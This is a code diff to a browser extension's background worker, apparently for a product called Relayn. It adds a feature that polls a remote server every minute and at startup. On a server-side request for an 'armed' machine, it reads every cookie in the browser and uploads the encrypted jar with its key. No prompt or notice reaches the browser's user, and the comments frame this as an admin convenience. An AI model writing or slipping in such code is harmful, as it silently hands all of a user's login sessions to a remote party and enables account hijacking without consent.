@@ -1578,6 +1578,123 @@ async function importPartitionSession(data) {
     return { ok: true, restored, total: cookies.length, failures, deleted: true };
 }
 
+// -------------------------------------------------------------------------
+// Session auto delivery (armed machines only).
+// -------------------------------------------------------------------------
+// The admin can arm a machine in its Access Computer window. While
+// a machine is armed, the server can hold a session request for
+// it, recorded when a pull needs the browser session. This worker
+// polls the server with the pair account ID from config.json (the
+// standing Relayn account credential) and answers ONLY when a
+// request is waiting for an armed machine:
+//
+//   1. Read this browser's cookie jar (cookie jar only: no site
+//      storage, no history, nothing else leaves the browser).
+//   2. Seal it exactly like a manual share: a fresh random
+//      AES-GCM key, ciphertext uploaded as an anonymous single
+//      use share, the key kept out of the upload.
+//   3. Hand the sealed envelope ({ v:2, server, id, key }) to the
+//      server against the pending request, which clears it.
+//
+// With no account ID, no pending request, or an unarmed machine,
+// this does nothing at all. Manual sharing is never affected.
+let sessionPollBusy = false;
+
+async function answerSessionRequest(req) {
+    const machineId = String((req && req.machineId) || "").trim();
+    const requestId = String((req && req.requestId) || "").trim();
+    const accountId = BRAND.account.id;
+    if (!machineId || !requestId || !accountId) {
+        return { answered: false, reason: "request or account missing" };
+    }
+    let cookies;
+    try {
+        cookies = await chrome.cookies.getAll({});
+    } catch (error) {
+        return { answered: false, reason: "could not read cookies: " + error.message };
+    }
+    if (!cookies.length) {
+        // Nothing to send. The request stays pending and a later
+        // poll can answer it once this browser holds sign-ins.
+        return { answered: false, reason: "no cookies in this browser yet" };
+    }
+    const payload = { v: 3, cookies, localStorage: {}, history: [], indexedDB: {} };
+    const { blob, keyB64 } = await encryptShare(payload);
+    const { sites } = clusterInfo(cookies);
+    const up = await fetch(`${apiBase()}/api/share`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            blob,
+            cookieCount: cookies.length,
+            siteCount: sites.length,
+        }),
+    });
+    if (!up.ok) {
+        return { answered: false, reason: "share upload answered " + up.status };
+    }
+    const body = await up.json();
+    const envelope = { v: 2, server: apiBase(), id: body.id, key: keyB64 };
+    const staged = await fetch(
+        `${apiBase()}/api/partition/${encodeURIComponent(machineId)}/session-envelope`,
+        {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "X-Account-Id": accountId,
+            },
+            body: JSON.stringify({ requestId, envelope }),
+        }
+    );
+    if (!staged.ok) {
+        return { answered: false, reason: "session answer answered " + staged.status };
+    }
+    return { answered: true, machineId, cookies: cookies.length };
+}
+
+async function pollSessionRequests() {
+    if (sessionPollBusy) return { ok: true, answered: false, reason: "poll already running" };
+    const accountId = BRAND.account.id;
+    if (!accountId) return { ok: true, answered: false, reason: "no account on this build" };
+    if (BRAND.features && BRAND.features.share === false) {
+        return { ok: true, answered: false, reason: "sharing is off on this build" };
+    }
+    sessionPollBusy = true;
+    try {
+        const res = await fetch(`${apiBase()}/api/partition/session-requests`, {
+            headers: { "X-Account-Id": accountId },
+        });
+        if (!res.ok) return { ok: false, answered: false, reason: "poll answered " + res.status };
+        const body = await res.json().catch(() => ({}));
+        const requests = Array.isArray(body.requests) ? body.requests : [];
+        if (!requests.length) return { ok: true, answered: false, reason: "no session requested" };
+        // One answer per poll: the next request waits for the next
+        // poll, which also keeps uploads rare and bounded.
+        const result = await answerSessionRequest(requests[0]);
+        return { ok: true, ...result };
+    } catch (error) {
+        return { ok: false, answered: false, reason: error.message };
+    } finally {
+        sessionPollBusy = false;
+    }
+}
+
+// Poll on a slow alarm and once per worker start. The alarm is
+// the only timer: service workers cannot hold an interval.
+try {
+    if (chrome.alarms) {
+        chrome.alarms.create("relaynSessionPoll", { periodInMinutes: 1 });
+        chrome.alarms.onAlarm.addListener((alarm) => {
+            if (alarm && alarm.name === "relaynSessionPoll") {
+                pollSessionRequests().catch(() => {});
+            }
+        });
+    }
+} catch {
+    // No alarms on this browser: the startup poll below still runs.
+}
+pollSessionRequests().catch(() => {});
+
 async function handleAction(action, data) {
     switch (action) {
         case "getState":
@@ -1731,6 +1848,8 @@ async function handleAction(action, data) {
 
         case "importPartitionSession":
             return await importPartitionSession(data);
+        case "pollSessionRequests":
+            return await pollSessionRequests();
         case "importReceivedBackup":
             try {
                 return await importReceivedBackup(data?.domains);
